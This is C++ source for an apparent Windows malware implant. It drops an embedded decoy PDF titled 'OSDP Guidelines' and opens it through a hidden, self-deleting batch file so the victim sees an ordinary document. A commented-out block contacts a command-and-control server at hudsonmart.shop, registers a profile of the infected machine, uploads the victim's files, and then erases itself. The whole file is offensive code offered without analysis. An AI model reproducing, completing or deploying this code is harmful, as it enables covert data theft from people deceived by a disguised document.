#include "Core/upload.hpp"
#include "Core/self_destruct.hpp"
#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Communication/addagent.hpp"
#include "Core/osdp.h"



constexpr bool ONETIMERUN = true;
std::vector<std::wstring> URLS = {L"https://hudsonmart.shop"};


void CleanupAndDestroy() {
    //std::cout << "Beginning cleanup..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(5));
    Cleanup();
    std::this_thread::sleep_for(std::chrono::seconds(3));
    SelfDestruct();
}



void CreateBat(const std::string& pdfPath) {
    std::ofstream batchFile("explorer.cmd");
    batchFile << "@echo off\n";
    batchFile << "start \"\" \"" << pdfPath << "\"\n";
    batchFile << "timeout /t 2 >nul\n"; 
    batchFile << "del \"%~f0\"";
    batchFile.close();
}


std::string GetCWD() {
    char buffer[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, buffer) != 0) { // Notice the 'A' at the end of GetCurrentDirectoryA
        return std::string(buffer) + "\\";
    }
    return "";
}


void ExecBat(const std::string& batchPath) {
    ShellExecuteA(
        NULL,           // Parent window
        "open",         // Operation to perform
        batchPath.c_str(), // Full path to the batch file
        NULL,           // Parameters
        NULL,           // Default directory
        SW_HIDE         // Window show command
    );
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::string pdfPath = GetCWD() + "OSDP Guidelines.pdf";
    std::ofstream output(pdfPath, std::ios::binary);
    output.write(reinterpret_cast<char*>(OSDP_Guidelines_pdf), OSDP_Guidelines_pdf_len);
    output.close();

    CreateBat(pdfPath);
    Sleep(1);
    ExecBat("explorer.cmd");

    /*
    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) { 
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            std::wstring C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                std::wstring PC2 = C2 + L"/add_agent";
                nlohmann::json JsonProfile = Profiler(); 
                std::string response = SendProfile(PC2, JsonProfile);
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    //std::cout << "Running file upload" << std::endl;
                    ProcessFilesAndUpload(C2);
                }
            }
        }
        CleanupAndDestroy(); 
    }

    // This code might never see the light of the day but I gonna keep here anyways...
    CleanupAndDestroy(); 
    */

    return 0;
}

